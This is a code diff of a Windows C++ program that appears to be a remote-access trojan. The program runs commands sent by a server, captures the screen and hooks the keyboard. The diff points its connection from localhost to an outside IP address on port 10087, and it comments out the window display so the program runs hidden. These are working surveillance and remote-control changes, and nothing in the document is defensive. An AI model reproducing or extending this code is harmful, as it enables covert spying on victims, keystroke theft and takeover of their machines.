@@ -171,6 +171,7 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
 
             recvdata(s, pdata, drbuf.length);
 
+            //cmd请求
             if (drbuf.type == SEVER_CMD_COMMAND)
             {
 
@@ -198,8 +199,9 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
                     send(s, (char*)cmdback, cmdback->length + sizeof(unsigned int) * 2, 0);
 
                 }
-            }
+            }  
 
+            //屏幕监控请求
             else if (drbuf.type == SERVER_SCREEN_COMMAND)
             {
                 sendcapture(s);
@@ -258,6 +260,8 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
     //}
     return true;
 }
+
+
 // 此代码模块中包含的函数的前向声明:
 ATOM                MyRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
@@ -326,7 +330,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     addr.sin_family = AF_INET;
 
 
-    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+    addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
     addr.sin_port = htons(10087);
 
     connect(s, (sockaddr*)&addr, length);
@@ -464,8 +468,10 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
       return FALSE;
    }
 
-   ShowWindow(hWnd, nCmdShow);
-   UpdateWindow(hWnd);
+
+   //取消窗口显示
+   /*ShowWindow(hWnd, nCmdShow);
+   UpdateWindow(hWnd);*/
 
    mykeyboardhook(hWnd);
 
